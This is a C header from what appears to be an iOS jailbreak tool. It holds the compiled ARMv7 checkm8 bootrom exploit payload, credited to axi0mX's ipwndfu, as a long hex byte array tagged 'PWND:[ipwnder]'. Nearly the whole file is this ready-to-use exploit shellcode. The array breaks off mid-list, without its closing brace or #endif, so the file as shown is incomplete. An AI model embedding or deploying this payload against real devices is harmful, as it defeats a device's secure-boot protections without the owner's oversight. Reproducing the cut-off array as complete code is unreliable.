/*
 * checkm8_payload.h - exploit discovered by axi0mX.
 * copyright (C) 2020/05/25 dora2ios
 *
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#ifndef checkm8_payload_H
#define checkm8_payload_H


// Based on ipwndfu payload by axi0mX
// https://github.com/axi0mX/ipwndfu/blob/0e28932ec6a2a570b10fd77e50bda4216418cd98/src/checkm8_armv7.S

/* with pwnder */
unsigned char checkm8_payload_armv7_with_img3_p[] = {
    0x00, 0x40, 0xa0, 0xe3, 0xf0, 0x40, 0x2d, 0xe9, 0x44, 0x01, 0x9f, 0xe5,
    0xd0, 0x00, 0xc0, 0xe1, 0x43, 0x2f, 0x8f, 0xe2, 0xd0, 0x40, 0xc2, 0xe1,
    0xf0, 0x40, 0xc0, 0xe1, 0xf0, 0x40, 0xc1, 0xe1, 0xd8, 0x40, 0xc2, 0xe1,
    0xf8, 0x40, 0xc0, 0xe1, 0xf8, 0x40, 0xc1, 0xe1, 0xd0, 0x41, 0xc2, 0xe1,
    0xf0, 0x41, 0xc0, 0xe1, 0xf0, 0x41, 0xc1, 0xe1, 0xd8, 0x41, 0xc2, 0xe1,
    0xf8, 0x41, 0xc0, 0xe1, 0xf8, 0x41, 0xc1, 0xe1, 0x0c, 0x01, 0x9f, 0xe5,
    0x01, 0x00, 0x80, 0xe2, 0x00, 0x10, 0xd0, 0xe5, 0x00, 0x00, 0x51, 0xe3,
    0xfb, 0xff, 0xff, 0x1a, 0xe4, 0x10, 0x8f, 0xe2, 0x00, 0x20, 0x91, 0xe5,
    0x04, 0x30, 0x91, 0xe5, 0x00, 0x20, 0x80, 0xe5, 0x04, 0x30, 0x80, 0xe5,
    0x08, 0x20, 0x91, 0xe5, 0x0c, 0x30, 0x91, 0xe5, 0x08, 0x20, 0x80, 0xe5,
    0x0c, 0x30, 0x80, 0xe5, 0xd4, 0x00, 0x9f, 0xe5, 0xd4, 0x10, 0x9f, 0xe5,
    0xd4, 0x40, 0x9f, 0xe5, 0x31, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xc4, 0xe5,
    0xcc, 0x00, 0x9f, 0xe5, 0x9c, 0x10, 0x4f, 0xe2, 0xc8, 0x20, 0x9f, 0xe5,
    0x02, 0x10, 0x81, 0xe0, 0x00, 0x20, 0xa0, 0xe3, 0xc0, 0x30, 0x9f, 0xe5,
    0xc0, 0x40, 0x9f, 0xe5, 0x09, 0x50, 0x80, 0xe2, 0x00, 0x50, 0x84, 0xe5,
    0xd0, 0x40, 0xc1, 0xe1, 0xf0, 0x40, 0xc0, 0xe1, 0xd8, 0x40, 0xc1, 0xe1,
    0xf8, 0x40, 0xc0, 0xe1, 0xd0, 0x41, 0xc1, 0xe1, 0xf0, 0x41, 0xc0, 0xe1,
    0xd8, 0x41, 0xc1, 0xe1, 0xf8, 0x41, 0xc0, 0xe1, 0xd0, 0x42, 0xc1, 0xe1,
    0xf0, 0x42, 0xc0, 0xe1, 0xd8, 0x42, 0xc1, 0xe1, 0xf8, 0x42, 0xc0, 0xe1,
    0xd0, 0x43, 0xc1, 0xe1, 0xf0, 0x43, 0xc0, 0xe1, 0xd8, 0x43, 0xc1, 0xe1,
    0xf8, 0x43, 0xc0, 0xe1, 0x3e, 0x0f, 0x07, 0xee, 0x5f, 0xf0, 0x7f, 0xf5,
    0x40, 0x00, 0x80, 0xe2, 0x40, 0x10, 0x81, 0xe2, 0x40, 0x20, 0x82, 0xe2,
    0x03, 0x00, 0x52, 0xe1, 0xe8, 0xff, 0xff, 0x3a, 0x00, 0x00, 0xa0, 0xe3,
    0x15, 0x0f, 0x07, 0xee, 0x4f, 0xf0, 0x7f, 0xf5, 0x6f, 0xf0, 0x7f, 0xf5,
    0xf0, 0x80, 0xbd, 0xe8, 0x09, 0x02, 0x19, 0x00, 0x01, 0x01, 0x05, 0x80,
    0xfa, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01, 0x00, 0x00, 0x07, 0x21,
    0x01, 0x0a, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x20, 0x50, 0x57, 0x4e, 0x44, 0x3a, 0x5b, 0x69, 0x70, 0x77, 0x6e, 0x64,
    0x65, 0x72, 0x5d, 0x00, 0x01, 0x00, 0xd0, 0xba, 0x02, 0x00, 0xd0, 0xba,
    0x03, 0x00, 0xd0, 0xba, 0x04, 0x00, 0xd0, 0xba, 0x05, 0x00, 0xd0, 0xba,
    0x06, 0x00, 0xd0, 0xba, 0x07, 0x00, 0xd0, 0xba, 0x08, 0x00, 0xd0, 0xba,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xce, 0xfa, 0xed, 0xfe, 0xbe, 0xba, 0xfe, 0xca, 0x02, 0x88, 0x40, 0xf2,
    0xa1, 0x23, 0x9a, 0x42, 0xf6, 0xd1, 0xf0, 0xb5, 0x03, 0xaf, 0x84, 0xb0,
    0x04, 0x1c, 0x32, 0x4d, 0x4f, 0xf6, 0xff, 0x71, 0x62, 0x88, 0x91, 0x42,
    0x48, 0xd1, 0xd5, 0xe9, 0x00, 0x01, 0x2f, 0x4a, 0x90, 0x42, 0x43, 0xd1,
    0x2e, 0x48, 0x2c, 0x49, 0x4a, 0x68, 0x00, 0xf0, 0x4a, 0xf8, 0x00, 0x28,
    0x3c, 0xd0, 0x06, 0x1c, 0x0c, 0x21, 0x89, 0x19, 0x0a, 0x68, 0x2a, 0x49,
    0x91, 0x42, 0x23, 0xd0, 0x29, 0x48, 0x25, 0x49, 0x4a, 0x68, 0x00, 0xf0,
    0x3c, 0xf8, 0x00, 0x28, 0x2e, 0xd0, 0x05, 0x1c, 0x11, 0x20, 0x14, 0x24,
    0x29, 0x19, 0x2a, 0x19, 0x30, 0x23, 0x24, 0x4c, 0x00, 0x94, 0x00, 0x24,
    0x01, 0x94, 0x00, 0x24, 0x02, 0x94, 0x22, 0x4c, 0xa0, 0x47, 0x11, 0x20,
    0x0c, 0x24, 0x31, 0x19, 0x32, 0x19, 0xb3, 0x68, 0x1f, 0x4c, 0x00, 0x94,
    0x24, 0x24, 0x64, 0x19, 0x01, 0x94, 0x14, 0x24, 0x64, 0x19, 0x02, 0x94,
    0x1a, 0x4c, 0xa0, 0x47, 0x13, 0x48, 0x0c, 0x21, 0x89, 0x19, 0xb2, 0x68,
    0x15, 0x1c, 0x00, 0xf0, 0x0e, 0xf8, 0x10, 0x48, 0x29, 0x1c, 0x17, 0x4b,
    0x98, 0x47, 0x17, 0x4b, 0x98, 0x47, 0x01, 0x1c, 0x00, 0x20, 0x0c, 0x4a,
    0x15, 0x4b, 0x98, 0x47, 0x00, 0x20, 0x04, 0xb0, 0xf0, 0xbd, 0x0b, 0x78,
    0x03, 0x70, 0x01, 0x30, 0x01, 0x31, 0x01, 0x3a, 0x00, 0x2a, 0xf8, 0xd1,
    0x70, 0x47, 0x10, 0xb5, 0x0c, 0x68, 0x84, 0x42, 0x04, 0xd0, 0x02, 0x31,
    0x02, 0x3a, 0x00, 0x2a, 0xf8, 0xd1, 0x00, 0x21, 0x08, 0x1c, 0x10, 0xbd,
    0x01, 0x00, 0xd0, 0xba, 0x02, 0x00, 0xd0, 0xba, 0x03, 0x00, 0xd0, 0xba,
    0x05, 0x00, 0xd0, 0xba, 0x04, 0x00, 0xd0, 0xba, 0x06, 0x00, 0xd0, 0xba,
    0x07, 0x00, 0xd0, 0xba, 0x08, 0x00, 0xd0, 0xba, 0x09, 0x00, 0xd0, 0xba,
    0x0a, 0x00, 0xd0, 0xba, 0x0b, 0x00, 0xd0, 0xba, 0x90, 0xb4, 0x82, 0xb0,
    0x00, 0xaf, 0x78, 0x60, 0x7c, 0x68, 0x00, 0xe0, 0x01, 0x34, 0x23, 0x78,
    0x00, 0x2b, 0xfb, 0xd1, 0x22, 0x46, 0x7b, 0x68, 0xd3, 0x1a, 0x18, 0x46,
    0x08, 0x37, 0xbd, 0x46, 0x90, 0xbc, 0x70, 0x47, 0x80, 0xb4, 0x89, 0xb0,
    0x00, 0xaf, 0xf8, 0x60, 0xb9, 0x60, 0x7a, 0x60, 0x3b, 0x60, 0xfb, 0x68,
    0xbb, 0x61, 0xbb, 0x68, 0x00, 0x2b, 0x01, 0xdc, 0x00, 0x23, 0x2a, 0xe0,
    0xbb, 0x6a, 0x00, 0x2b, 0x07, 0xda, 0xbb, 0x68, 0x5b, 0x42, 0xbb, 0x60,
    0xba, 0x68, 0xbb, 0x6a, 0x13, 0x40, 0xbb, 0x60, 0x04, 0xe0, 0xbb, 0x6a,
    0x5b, 0x42, 0xba, 0x68, 0x13, 0x40, 0xbb, 0x60, 0x00, 0x23, 0xfb, 0x61,
    0x12, 0xe0, 0xfb, 0x69, 0xba, 0x69, 0x13, 0x44, 0x1b, 0x68, 0x7b, 0x61,
    0x3a, 0x68, 0x7b, 0x69, 0x1a, 0x40, 0x7b, 0x68, 0x9a, 0x42, 0x03, 0xd1,
    0xfb, 0x69, 0xba, 0x69, 0x13, 0x44, 0x08, 0xe0, 0xfa, 0x69, 0xbb, 0x6a,
    0x13, 0x44, 0xfb, 0x61, 0xfa, 0x69, 0xbb, 0x68, 0x9a, 0x42, 0xe8, 0xd1,
    0x00, 0x23, 0x18, 0x46, 0x24, 0x37, 0xbd, 0x46, 0x5d, 0xf8, 0x04, 0x7b,
    0x70, 0x47, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0, 0x02, 0xaf, 0x78, 0x60,
    0x39, 0x60, 0x6f, 0xf0, 0x01, 0x03, 0x00, 0x93, 0x78, 0x68, 0x39, 0x68,
    0x4b, 0xf2, 0xf0, 0x52, 0x4f, 0xf6, 0xff, 0x73, 0xff, 0xf7, 0xb0, 0xff,
    0x03, 0x46, 0x18, 0x46, 0x08, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x00, 0xbf,
    0x80, 0xb5, 0x84, 0xb0, 0x02, 0xaf, 0x78, 0x60, 0x39, 0x60, 0x01, 0x23,
    0x00, 0x93, 0x78, 0x68, 0x39, 0x68, 0x4f, 0xf4, 0x70, 0x42, 0xcd, 0xf2,
    0x00, 0x02, 0x4f, 0xf4, 0x78, 0x43, 0xcd, 0xf2, 0x00, 0x03, 0xff, 0xf7,
    0x97, 0xff, 0x03, 0x46, 0x18, 0x46, 0x08, 0x37, 0xbd, 0x46, 0x80, 0xbd,
    0x80, 0xb4, 0x83, 0xb0, 0x00, 0xaf, 0x78, 0x60, 0x7b, 0x68, 0x1b, 0x78,
    0xc3, 0xf3, 0x03, 0x03, 0xdb, 0xb2, 0x1b, 0x01, 0x9a, 0xb2, 0x7b, 0x68,
    0x5b, 0x78, 0xc3, 0xf3, 0x80, 0x03, 0xdb, 0xb2, 0xdb, 0x00, 0x9b, 0xb2,
    0x13, 0x44, 0x9a, 0xb2, 0x7b, 0x68, 0xdb, 0x78, 0xc3, 0xf3, 0x02, 0x13,
    0xdb, 0xb2, 0x13, 0x44, 0x9b, 0xb2, 0x1b, 0x02, 0x9a, 0xb2, 0x7b, 0x68,
    0x9b, 0x78, 0x13, 0x44, 0x9b, 0xb2, 0x18, 0x46, 0x0c, 0x37, 0xbd, 0x46,
    0x5d, 0xf8, 0x04, 0x7b, 0x70, 0x47, 0x00, 0xbf, 0x80, 0xb4, 0x85, 0xb0,
    0x00, 0xaf, 0x78, 0x60, 0x7b, 0x68, 0xfb, 0x60, 0xfb, 0x68, 0x1a, 0x78,
    0x12, 0x09, 0xd2, 0xb2, 0x5b, 0x78, 0x03, 0xf0, 0x03, 0x03, 0x1b, 0x01,
    0x13, 0x43, 0xdb, 0xb2, 0x24, 0x2b, 0x0f, 0xd1, 0xfb, 0x68, 0x5b, 0x78,
    0xc3, 0xf3, 0xc4, 0x03, 0xdb, 0xb2, 0x1e, 0x2b, 0x08, 0xd1, 0xfb, 0x68,
    0xdb, 0x78, 0xc3, 0xf3, 0xc0, 0x13, 0xdb, 0xb2, 0x00, 0x2b, 0x01, 0xd1,
    0x01, 0x23, 0x00, 0xe0, 0x00, 0x23, 0x18, 0x46, 0x14, 0x37, 0xbd, 0x46,
    0x5d, 0xf8, 0x04, 0x7b, 0x70, 0x47, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0,
    0x02, 0xaf, 0x78, 0x60, 0x39, 0x60, 0x4f, 0xf0, 0xff, 0x33, 0x00, 0x93,
    0x78, 0x68, 0x39, 0x68, 0x4f, 0xf4, 0x90, 0x42, 0x4f, 0xf4, 0x78, 0x43,
    0xff, 0xf7, 0x30, 0xff, 0x03, 0x46, 0x18, 0x46, 0x08, 0x37, 0xbd, 0x46,
    0x80, 0xbd, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0, 0x02, 0xaf, 0x78, 0x60,
    0x39, 0x60, 0x4f, 0xf0, 0xff, 0x33, 0x00, 0x93, 0x78, 0x68, 0x39, 0x68,
    0x4f, 0xf6, 0xdf, 0x02, 0x4f, 0xf6, 0xff, 0x73, 0xff, 0xf7, 0x1a, 0xff,
    0x03, 0x46, 0x18, 0x46, 0x08, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x00, 0xbf,
    0x80, 0xb5, 0x8a, 0xb0, 0x00, 0xaf, 0x78, 0x60, 0x7b, 0x68, 0x3b, 0x62,
    0x3b, 0x6a, 0x7b, 0x62, 0x3b, 0x6a, 0xa3, 0xf5, 0x84, 0x63, 0xfb, 0x61,
    0x22, 0xe0, 0x7a, 0x6a, 0x79, 0x6a, 0xfb, 0x69, 0xcb, 0x1a, 0x10, 0x46,
    0x19, 0x46, 0xff, 0xf7, 0xbf, 0xff, 0x03, 0x46, 0x7b, 0x62, 0x7b, 0x6a,
    0x00, 0x2b, 0x00, 0xd1, 0x18, 0xe0, 0x7b, 0x6a, 0x1b, 0x68, 0xbb, 0x61,
    0x7b, 0x6a, 0x04, 0x33, 0x23, 0xf0, 0x03, 0x02, 0xbb, 0x69, 0xdb, 0xb2,
    0x9b, 0x00, 0x13, 0x44, 0x7b, 0x61, 0x7a, 0x69, 0x3b, 0x6a, 0x9a, 0x42,
    0x01, 0xd1, 0x7b, 0x6a, 0x36, 0xe0, 0x7b, 0x6a, 0x02, 0x3b, 0x7b, 0x62,
    0x7a, 0x6a, 0xfb, 0x69, 0x9a, 0x42, 0xd8, 0xd8, 0x3b, 0x6a, 0xa3, 0xf5,
    0x80, 0x53, 0xfb, 0x61, 0x3b, 0x6a, 0x7b, 0x62, 0x23, 0xe0, 0x7a, 0x6a,
    0x79, 0x6a, 0xfb, 0x69, 0xcb, 0x1a, 0x10, 0x46, 0x19, 0x46, 0xff, 0xf7,
    0xa7, 0xff, 0x03, 0x46, 0x7b, 0x62, 0x7b, 0x6a, 0x00, 0x2b, 0x00, 0xd1,
    0x19, 0xe0, 0x7b, 0x6a, 0x1b, 0x68, 0x3b, 0x61, 0x7b, 0x6a, 0x04, 0x33,
    0x23, 0xf0, 0x03, 0x02, 0x3b, 0x69, 0x1b, 0x0c, 0xc3, 0xf3, 0x0b, 0x03,
    0x13, 0x44, 0xfb, 0x60, 0xfa, 0x68, 0x3b, 0x6a, 0x9a, 0x42, 0x01, 0xd1,
    0x7b, 0x6a, 0x07, 0xe0, 0x7b, 0x6a, 0x04, 0x3b, 0x7b, 0x62, 0x7a, 0x6a,
    0xfb, 0x69, 0x9a, 0x42, 0xd7, 0xd8, 0x00, 0x23, 0x18, 0x46, 0x28, 0x37,
    0xbd, 0x46, 0x80, 0xbd, 0x80, 0xb4, 0x89, 0xb0, 0x00, 0xaf, 0xf8, 0x60,
    0xb9, 0x60, 0x7a, 0x60, 0x3b, 0x60, 0xfb, 0x68, 0x7b, 0x61, 0x7b, 0x68,
    0x3b, 0x61, 0x00, 0x23, 0xfb, 0x61, 0x1e, 0xe0, 0x00, 0x23, 0xbb, 0x61,
    0x13, 0xe0, 0xfa, 0x69, 0xbb, 0x69, 0x13, 0x44, 0x7a, 0x69, 0x13, 0x44,
    0x1a, 0x78, 0xbb, 0x69, 0x39, 0x69, 0x0b, 0x44, 0x1b, 0x78, 0x9a, 0x42,
    0x04, 0xd0, 0x00, 0xbf, 0xfb, 0x69, 0x01, 0x33, 0xfb, 0x61, 0x0a, 0xe0,
    0xbb, 0x69, 0x01, 0x33, 0xbb, 0x61, 0xba, 0x69, 0x3b, 0x68, 0x9a, 0x42,
    0xe7, 0xdb, 0xfb, 0x69, 0x7a, 0x69, 0x13, 0x44, 0x04, 0xe0, 0xfa, 0x69,
    0xbb, 0x68, 0x9a, 0x42, 0xdc, 0xdb, 0x00, 0x23, 0x18, 0x46, 0x24, 0x37,
    0xbd, 0x46, 0x5d, 0xf8, 0x04, 0x7b, 0x70, 0x47, 0x90, 0xb5, 0x85, 0xb0,
    0x00, 0xaf, 0xf8, 0x60, 0xb9, 0x60, 0x7a, 0x60, 0xbc, 0x68, 0x78, 0x68,
    0xff, 0xf7, 0x58, 0xfe, 0x03, 0x46, 0xf8, 0x68, 0x21, 0x46, 0x7a, 0x68,
    0xff, 0xf7, 0xb8, 0xff, 0x03, 0x46, 0x18, 0x46, 0x14, 0x37, 0xbd, 0x46,
    0x90, 0xbd, 0x00, 0xbf, 0x80, 0xb4, 0x87, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x7b, 0x68, 0x1b, 0x88, 0x3b, 0x82, 0x7b, 0x68, 0x5b, 0x88, 0xbb, 0x81,
    0x00, 0x23, 0x7b, 0x61, 0x7b, 0x7c, 0xc3, 0xf3, 0x80, 0x03, 0xdb, 0xb2,
    0x1b, 0x06, 0x7a, 0x69, 0x13, 0x43, 0x7b, 0x61, 0x7b, 0x7c, 0xc3, 0xf3,
    0x80, 0x03, 0xdb, 0xb2, 0x1a, 0x46, 0x7b, 0x7b, 0xc3, 0xf3, 0x40, 0x13,
    0xdb, 0xb2, 0x53, 0x40, 0x03, 0xf0, 0x01, 0x03, 0x00, 0x2b, 0x02, 0xd1,
    0x4f, 0xf4, 0x00, 0x03, 0x00, 0xe0, 0x00, 0x23, 0x7a, 0x69, 0x13, 0x43,
    0x7b, 0x61, 0x7b, 0x7c, 0xc3, 0xf3, 0x80, 0x03, 0xdb, 0xb2, 0x1a, 0x46,
    0x7b, 0x7b, 0xc3, 0xf3, 0xc0, 0x03, 0xdb, 0xb2, 0x53, 0x40, 0x03, 0xf0,
    0x01, 0x03, 0x00, 0x2b, 0x02, 0xd1, 0x4f, 0xf4, 0x80, 0x03, 0x00, 0xe0,
    0x00, 0x23, 0x7a, 0x69, 0x13, 0x43, 0x7b, 0x61, 0x3b, 0x8a, 0xc3, 0xf3,
    0x09, 0x03, 0x9b, 0xb2, 0x1b, 0x03, 0x7a, 0x69, 0x13, 0x43, 0x7b, 0x61,
    0xbb, 0x89, 0xc3, 0xf3, 0x0a, 0x03, 0x9b, 0xb2, 0x5b, 0x00, 0x7a, 0x69,
    0x13, 0x43, 0x7b, 0x61, 0x7b, 0x7b, 0xc3, 0xf3, 0x00, 0x13, 0xdb, 0xb2,
    0x7a, 0x69, 0x13, 0x43, 0x7b, 0x61, 0x7b, 0x69, 0xdb, 0x01, 0x7b, 0x61,
    0x7b, 0x69, 0xdb, 0x11, 0x7b, 0x61, 0x7b, 0x69, 0x04, 0x33, 0x7a, 0x68,
    0x13, 0x44, 0x18, 0x46, 0x1c, 0x37, 0xbd, 0x46, 0x5d, 0xf8, 0x04, 0x7b,
    0x70, 0x47, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x39, 0x60, 0x7b, 0x68, 0x19, 0x68, 0x7b, 0x68, 0x5b, 0x68, 0x1a, 0x46,
    0x3b, 0x46, 0x08, 0x46, 0x11, 0x46, 0x1a, 0x46, 0x04, 0x23, 0xff, 0xf7,
    0x3b, 0xff, 0xf8, 0x60, 0xfb, 0x68, 0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23,
    0x09, 0xe0, 0xf8, 0x68, 0xff, 0xf7, 0xca, 0xfe, 0xb8, 0x60, 0xbb, 0x68,
    0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23, 0x00, 0xe0, 0xbb, 0x68, 0x18, 0x46,
    0x10, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x00, 0xbf, 0x80, 0xb5, 0x86, 0xb0,
    0x00, 0xaf, 0xf8, 0x60, 0xb9, 0x60, 0x13, 0x46, 0xfb, 0x80, 0x00, 0x23,
    0x7b, 0x61, 0x18, 0xe0, 0x7b, 0x69, 0xfa, 0x68, 0x13, 0x44, 0x3b, 0x61,
    0x7b, 0x69, 0xfa, 0x68, 0x13, 0x44, 0x18, 0x46, 0xff, 0xf7, 0x54, 0xfe,
    0x03, 0x46, 0x00, 0x2b, 0x08, 0xd0, 0x38, 0x69, 0xff, 0xf7, 0x26, 0xfe,
    0x03, 0x46, 0xfa, 0x88, 0x9a, 0x42, 0x01, 0xd1, 0x3b, 0x69, 0x07, 0xe0,
    0x7b, 0x69, 0x02, 0x33, 0x7b, 0x61, 0x7a, 0x69, 0xbb, 0x68, 0x9a, 0x42,
    0xe2, 0xd3, 0x00, 0x23, 0x18, 0x46, 0x18, 0x37, 0xbd, 0x46, 0x80, 0xbd,
    0x80, 0xb5, 0x86, 0xb0, 0x00, 0xaf, 0x78, 0x60, 0x39, 0x60, 0x00, 0x23,
    0x7b, 0x61, 0x19, 0xe0, 0x7b, 0x68, 0x1a, 0x68, 0x7b, 0x69, 0x13, 0x44,
    0x18, 0x46, 0xff, 0xf7, 0x39, 0xff, 0x38, 0x61, 0x7b, 0x68, 0x1b, 0x68,
    0x5b, 0x42, 0x3a, 0x69, 0x13, 0x44, 0xfb, 0x60, 0xfa, 0x68, 0x3b, 0x68,
    0x9a, 0x42, 0x04, 0xd1, 0x7b, 0x68, 0x1a, 0x68, 0x7b, 0x69, 0x13, 0x44,
    0x09, 0xe0, 0x7b, 0x69, 0x01, 0x33, 0x7b, 0x61, 0x7a, 0x69, 0x7b, 0x68,
    0x5b, 0x68, 0x04, 0x3b, 0x9a, 0x42, 0xdf, 0xd3, 0x00, 0x23, 0x18, 0x46,
    0x18, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x00, 0xbf, 0x80, 0xb5, 0x88, 0xb0,
    0x00, 0xaf, 0x78, 0x60, 0x39, 0x60, 0x00, 0x23, 0xfb, 0x61, 0x38, 0xe0,
    0x7b, 0x68, 0x1a, 0x68, 0xfb, 0x69, 0x13, 0x44, 0x18, 0x46, 0xff, 0xf7,
    0x0b, 0xff, 0x78, 0x61, 0x7b, 0x68, 0x1b, 0x68, 0x5b, 0x42, 0x7a, 0x69,
    0x13, 0x44, 0x3b, 0x61, 0x3a, 0x69, 0x3b, 0x68, 0x9a, 0x42, 0x23, 0xd1,
    0xfb, 0x69, 0x01, 0x33, 0xbb, 0x61, 0x19, 0xe0, 0x7b, 0x68, 0x1a, 0x68,
    0xbb, 0x69, 0x13, 0x44, 0x18, 0x46, 0xff, 0xf7, 0xf5, 0xfe, 0xf8, 0x60,
    0x7b, 0x68, 0x1b, 0x68, 0x5b, 0x42, 0xfa, 0x68, 0x13, 0x44, 0xbb, 0x60,
    0xba, 0x68, 0x3b, 0x68, 0x9a, 0x42, 0x04, 0xd1, 0x7b, 0x68, 0x1a, 0x68,
    0xbb, 0x69, 0x13, 0x44, 0x12, 0xe0, 0xbb, 0x69, 0x01, 0x33, 0xbb, 0x61,
    0xba, 0x69, 0x7b, 0x68, 0x5b, 0x68, 0x04, 0x3b, 0x9a, 0x42, 0xdf, 0xd3,
    0xfb, 0x69, 0x01, 0x33, 0xfb, 0x61, 0xfa, 0x69, 0x7b, 0x68, 0x5b, 0x68,
    0x04, 0x3b, 0x9a, 0x42, 0xc0, 0xd3, 0x00, 0x23, 0x18, 0x46, 0x20, 0x37,
    0xbd, 0x46, 0x80, 0xbd, 0x80, 0xb4, 0x83, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x7b, 0x68, 0x9a, 0x68, 0x40, 0xf2, 0xc1, 0x43, 0x9a, 0x42, 0x07, 0xd9,
    0x7b, 0x68, 0x9a, 0x68, 0x40, 0xf2, 0xc4, 0x43, 0x9a, 0x42, 0x01, 0xd8,
    0x05, 0x23, 0x28, 0xe0, 0x7b, 0x68, 0x9a, 0x68, 0x40, 0xf2, 0x01, 0x63,
    0x9a, 0x42, 0x01, 0xd1, 0x06, 0x23, 0x20, 0xe0, 0x7b, 0x68, 0x9a, 0x68,
    0x40, 0xf2, 0x94, 0x73, 0x9a, 0x42, 0x01, 0xd1, 0x07, 0x23, 0x18, 0xe0,
    0x7b, 0x68, 0x9a, 0x68, 0x40, 0xf6, 0xd5, 0x03, 0x9a, 0x42, 0x01, 0xd1,
    0x08, 0x23, 0x10, 0xe0, 0x7b, 0x68, 0x9a, 0x68, 0x40, 0xf6, 0x01, 0x33,
    0x9a, 0x42, 0x01, 0xd1, 0x09, 0x23, 0x08, 0xe0, 0x7b, 0x68, 0x9a, 0x68,
    0x40, 0xf6, 0x41, 0x53, 0x9a, 0x42, 0x01, 0xd1, 0x0a, 0x23, 0x00, 0xe0,
    0x00, 0x23, 0x18, 0x46, 0x0c, 0x37, 0xbd, 0x46, 0x5d, 0xf8, 0x04, 0x7b,
    0x70, 0x47, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x78, 0x68, 0x4f, 0xf4, 0xa0, 0x61, 0xff, 0xf7, 0x21, 0xfd, 0xf8, 0x60,
    0xfb, 0x68, 0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23, 0x03, 0xe0, 0xfb, 0x68,
    0x01, 0x33, 0xfb, 0x60, 0xfb, 0x68, 0x18, 0x46, 0x10, 0x37, 0xbd, 0x46,
    0x80, 0xbd, 0x00, 0xbf, 0x80, 0xb5, 0x84, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x39, 0x60, 0x38, 0x68, 0xff, 0xf7, 0xe0, 0xff, 0xf8, 0x60, 0xfb, 0x68,
    0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23, 0x0f, 0xe0, 0x7b, 0x68, 0x1b, 0x68,
    0x5b, 0x42, 0xfa, 0x68, 0x13, 0x44, 0x78, 0x68, 0x19, 0x46, 0xff, 0xf7,
    0x43, 0xff, 0xb8, 0x60, 0xbb, 0x68, 0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23,
    0x00, 0xe0, 0xbb, 0x68, 0x18, 0x46, 0x10, 0x37, 0xbd, 0x46, 0x80, 0xbd,
    0x80, 0xb5, 0x84, 0xb0, 0x00, 0xaf, 0x78, 0x60, 0x39, 0x60, 0x38, 0x68,
    0xff, 0xf7, 0xbe, 0xff, 0xf8, 0x60, 0xfb, 0x68, 0x00, 0x2b, 0x01, 0xd1,
    0x00, 0x23, 0x0f, 0xe0, 0x7b, 0x68, 0x1b, 0x68, 0x5b, 0x42, 0xfa, 0x68,
    0x13, 0x44, 0x78, 0x68, 0x19, 0x46, 0xff, 0xf7, 0xf3, 0xfe, 0xb8, 0x60,
    0xbb, 0x68, 0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23, 0x00, 0xe0, 0xbb, 0x68,
    0x18, 0x46, 0x10, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x80, 0xb5, 0x84, 0xb0,
    0x00, 0xaf, 0x78, 0x60, 0x78, 0x68, 0x45, 0xf2, 0x54, 0x21, 0xc4, 0xf2,
    0x45, 0x31, 0xff, 0xf7, 0x8b, 0xfe, 0xf8, 0x60, 0xfb, 0x68, 0x00, 0x2b,
    0x01, 0xd1, 0x00, 0x23, 0x05, 0xe0, 0x78, 0x68, 0xf9, 0x68, 0xff, 0xf7,
    0xc9, 0xff, 0xb8, 0x60, 0xbb, 0x68, 0x18, 0x46, 0x10, 0x37, 0xbd, 0x46,
    0x80, 0xbd, 0x00, 0xbf, 0x80, 0xb5, 0x86, 0xb0, 0x00, 0xaf, 0x78, 0x60,
    0x7b, 0x68, 0x1a, 0x68, 0x7b, 0x68, 0x5b, 0x68, 0x10, 0x46, 0x19, 0x46,
    0x45, 0xf2, 0x54, 0x22, 0xff, 0xf7, 0x92, 0xfe, 0x78, 0x61, 0x7b, 0x69,
    0x00, 0x2b, 0x01, 0xd1, 0x00, 0x23, 0x14, 0xe0, 0x78, 0x68, 0x79, 0x69,
    0xff, 0xf7, 0xaa, 0xff, 0x38, 0x61, 0x3b, 0x69, 0x00, 0x2b, 0x01, 0xd1,
    0x00, 0x23, 0x0a, 0xe0, 0x78, 0x68, 0x79, 0x69, 0xff, 0xf7, 0x7e, 0xff,
    0xf8, 0x60, 0xfb, 0x68, 0x00, 0x2b, 0x01, 0xd1, 0x3b, 0x69, 0x00, 0xe0,
    0xfb, 0x68, 0x18, 0x46, 0x18, 0x37, 0xbd, 0x46, 0x80, 0xbd, 0x00, 0xbf,
    0x80, 0xb5, 0x84, 0xb0, 0x00, 0xaf, 0x78, 0x60, 0x78, 0x68, 0xff, 0xf7,
    0x11, 0xff, 0xf8, 0x60, 0xfb, 0x68, 0x04, 0x2b, 0x07, 0xdd, 0xfb, 0x68,
    0x07, 0x2b, 0x04, 0xdc, 0x78, 0x68, 0xff, 0xf7, 0xc1, 0xff, 0x03, 0x46,
